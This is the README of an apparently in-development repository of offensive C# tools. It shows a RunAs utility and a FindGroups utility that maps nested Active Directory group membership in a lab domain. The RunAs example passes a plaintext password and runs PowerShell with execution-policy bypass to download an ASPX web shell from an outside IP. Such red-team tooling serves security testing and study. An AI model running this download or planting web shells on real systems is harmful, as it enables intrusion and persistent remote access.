# SharpSuite

SharpSuite is a collection of offensive C# toolkits.

> **Note**: This is in development!

# Tools

This section has an example of each tool.

## RunAs

`RunAs` lets you run a command as another user.

Execute a command as another user:

```powershell
PS C:\Users\Public\Documents> .\RunAs.exe /user:LazyUser2 /pass:'LazyAdminPwd123!' /cmd:'powershell -ep bypass IWR -Uri http://192.168.199.133:9998/cmdasp.aspx -OutFile C:\Users\Public\cmdasp.aspx'
```

The file was created as the user named `LazyUser2`:

```powershell
PS C:\Users\Public\Documents> Get-Acl C:\Users\Public\cmdasp.aspx | Format-Table -Wrap


    Directory: C:\Users\Public


Path        Owner                     Access                                                                           
----        -----                     ------                                                                           
cmdasp.aspx DESKTOP-E2HUJDU\LazyUser2 BUILTIN\Administrators Allow  FullControl                                        
                                      DESKTOP-E2HUJDU\LazyUser2 Allow  FullControl                                     
                                      NT AUTHORITY\SYSTEM Allow  FullControl                                           
                                      NT AUTHORITY\INTERACTIVE Allow  DeleteSubdirectoriesAndFiles, Modify, Synchronize
                                      NT AUTHORITY\SERVICE Allow  DeleteSubdirectoriesAndFiles, Modify, Synchronize    
                                      NT AUTHORITY\BATCH Allow  DeleteSubdirectoriesAndFiles, Modify, Synchronize  
```

## FindGroups

`FindGroups` is used to find nested groups and users that belong to groups in Active Directory.

> **Note**: This applies to both local connections and remote connections. This means that it can be used on servers and workstations that are joined to the domain. It allows you to enumerate groups and their members from other trusted connections/domains.

Search by using `localhost`:

```powershell
PS C:\Users\Administrator\Documents> .\FindGroups.exe /domain:'localhost' /group:"Domain Admins"
[+] Attempting to gather information!
[+] User: Administrator is a member of Domain Admins
[+] Group: Nested is a member of Domain Admins
[+] Group: NestedX2 is a member of Nested
[+] User: Lol Bins is a member of NestedX2
[+] Group: NestedX3 is a member of NestedX2
[+] Group: NestedX4 is a member of NestedX3
[i] Possible misconfiguration found:
        Group: NestedX4 is a member of NestedX4
[!] Stopping the search
```

Search by using the `domain name`:

```powershell
PS C:\Users\Administrator\Documents> .\FindGroups.exe /domain:'lab.local' /group:"Domain Admins"
[+] Attempting to gather information!
[+] User: Administrator is a member of Domain Admins
[+] Group: Nested is a member of Domain Admins
[+] Group: NestedX2 is a member of Nested
[+] User: Lol Bins is a member of NestedX2
[+] Group: NestedX3 is a member of NestedX2
[+] Group: NestedX4 is a member of NestedX3
[i] Possible misconfiguration found:
        Group: NestedX4 is a member of NestedX4
[!] Stopping the search
```

Search by using the `FQDN`:

```powershell
PS C:\Users\Administrator\Documents> .\FindGroups.exe /domain:'dc01.lab.local' /group:"Domain Admins"
[+] Attempting to gather information!
[+] User: Administrator is a member of Domain Admins
[+] Group: Nested is a member of Domain Admins
[+] Group: NestedX2 is a member of Nested
[+] User: Lol Bins is a member of NestedX2
[+] Group: NestedX3 is a member of NestedX2
[+] Group: NestedX4 is a member of NestedX3
[i] Possible misconfiguration found:
        Group: NestedX4 is a member of NestedX4
[!] Stopping the search
```

# ToDo

- [ ] Add more tools